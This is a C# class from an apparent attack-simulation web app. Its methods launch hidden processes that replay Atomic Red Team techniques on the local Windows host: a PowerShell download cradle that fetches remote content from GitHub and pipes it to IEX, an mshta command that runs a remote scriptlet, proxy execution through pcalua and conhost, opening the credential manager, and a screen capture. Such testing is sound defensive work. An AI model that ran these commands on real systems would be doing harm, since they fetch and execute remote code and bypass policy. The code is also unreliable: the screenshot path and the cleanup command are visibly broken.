using NuGet.Protocol.Plugins;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Security.Principal;

namespace AttackOnDotnetMvcCore.Models
{
    public class Test
    {
        public int ID { get; set; }
        public int TechniqueID { get; set; }
        public string? SubTechniqueID { get; set; }
        public string? SubTechniqueName { get; set; }
        public string Name { get; set; }
        public int Number { get; set; }
        public int PlatformID { get; set; }
        public string? ShortDescription { get; set; }
        public string? LongDescription { get; set; }
        public string Url { get; set; }

        public enum TestResult
        {
            Vulnerable,
            Secure,
            TestFailed,
            NotImplemented
        }

        public static TestResult RunTest1059_001_8()
        {
            var p = new Process
            {
                StartInfo =
                 {
                     FileName = "powershell",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = "-exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX\"",
                     UseShellExecute = false,
                     RedirectStandardOutput = true
                 }
            };
            p.Start();

            try
            {
                string output = p.StandardOutput.ReadLine();

                if (output != null && output.Contains("Download Cradle test success!"))
                {
                    return TestResult.Vulnerable;
                }
                else
                {
                    return TestResult.Secure;
                }
            }
            catch (Exception)
            {
                return TestResult.TestFailed;
            }
        }

        public static TestResult RunTest1059_001_9() 
        {
            var p = new Process
            {
                StartInfo =
                 {
                     FileName = "mshta.exe",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = "javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()\"\r\n",
                     UseShellExecute = false,
                     RedirectStandardOutput = true
                 }
            };
            try
            {
                p.Start();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("Access is denied"))
                {
                    return TestResult.Secure;
                }
            }

            try
            {
                string output = p.StandardOutput.ReadLine();

                if (output.Contains("Download Cradle test success!"))
                {
                    return TestResult.Vulnerable;
                }
                else
                {
                    return TestResult.Secure;
                }
            }
            catch (Exception)
            {
                return TestResult.TestFailed;
            }
        }

        public static TestResult RunTest1202_000_1()
        {
            var p = new Process
            {
                StartInfo =
                {
                     FileName = "powershell.exe",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = "pcalua.exe -a calc.exe; echo vulnerable",
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
                     RedirectStandardInput = true,
                }
            };
            try
            {
                p.Start();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("Access is denied"))
                {
                    return TestResult.Secure;
                }
            }
            try
            {
                string output = p.StandardOutput.ReadLine();

                if (output.Contains("vulnerable"))
                {
                    return TestResult.Vulnerable;
                }
                else
                {
                    return TestResult.Secure;
                }
            }
            catch (Exception)
            {
                return TestResult.TestFailed;
            }
        }

        public static TestResult RunTest1202_000_3()
        {
            var p = new Process
            {
                StartInfo =
                {
                     FileName = "powershell.exe",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = "conhost.exe calc.exe; echo vulnerable",
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
                     RedirectStandardInput = true,
                }
            };
            try
            {
                p.Start();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("Access is denied"))
                {
                    return TestResult.Secure;
                }
            }
            try
            {
                string output = p.StandardOutput.ReadLine();

                if (output.Contains("vulnerable"))
                {
                    return TestResult.Vulnerable;
                }
                else
                {
                    return TestResult.Secure;
                }
            }
            catch (Exception)
            {
                return TestResult.TestFailed;
            }
        }

        public static TestResult RunTest1003_000_6()
        {
            var p = new Process
            {
                StartInfo =
                {
                     FileName = "powershell.exe",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = "rundll32.exe keymgr,KRShowKeyMgr; echo vulnerable",
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
                     RedirectStandardInput = true,
                }
            };
            try
            {
                p.Start();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("Access is denied"))
                {
                    return TestResult.Secure;
                }
            }
            try
            {
                string output = p.StandardOutput.ReadLine();

                if (output.Contains("vulnerable"))
                {
                    return TestResult.Vulnerable;
                }
                else
                {
                    return TestResult.Secure;
                }
            }
            catch (Exception)
            {
                return TestResult.TestFailed;
            }
        }

        public static TestResult RunTest1113_000_6()
        {
            var username = WindowsIdentity.GetCurrent().Name.Split('\\')[1];
            string tempPath = String.Format("C:/Users/{0}/AppData/Local/Temp", username);
            string outputFileName = "/T1113.png";
            var p = new Process
            {
                StartInfo =
                {
                     FileName = "powershell.exe",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = String.Format("Add-Type -AssemblyName System.Windows.Forms;$screen=[Windows.Forms.SystemInformation]::VirtualScreen;$bitmap=New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic=[Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save(\"{0}{1}\");",username, outputFileName),
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
                     RedirectStandardInput = true,
                }
            };
            try
            {
                p.Start();
                p.WaitForExit();
                p.Close();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("Access is denied"))
                {
                    return TestResult.Secure;
                }
                else
                {
                    return TestResult.TestFailed;
                }
            }
            try
            {
                
                bool captureExists = File.Exists(tempPath + outputFileName);
                return captureExists ? TestResult.Vulnerable : TestResult.Secure;
            }
            catch (Exception)
            {
                return TestResult.TestFailed;
            }
        }

        public static bool RunCleanup1113_000_6()
        {
            var username = WindowsIdentity.GetCurrent().Name.Split('\\')[1];

            var p = new Process
            {
                StartInfo =
                {
                     FileName = "powershell.exe",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = String.Format("\\C:\\Users\\{0}\\AppData\\Local\\Temp\\T1113.png\");",username),
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
                     RedirectStandardInput = true,
                }
            };
            try
            {
                p.Start();
                string tempPath = String.Format("C:\\Users\\{0}\\AppData\\Local\\Temp", username);
                bool captureExists = File.Exists(tempPath + "/T1113.png");
                return !captureExists;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public static TestResult TestNotFound()
        {
            return TestResult.NotImplemented;
        }
    }
}
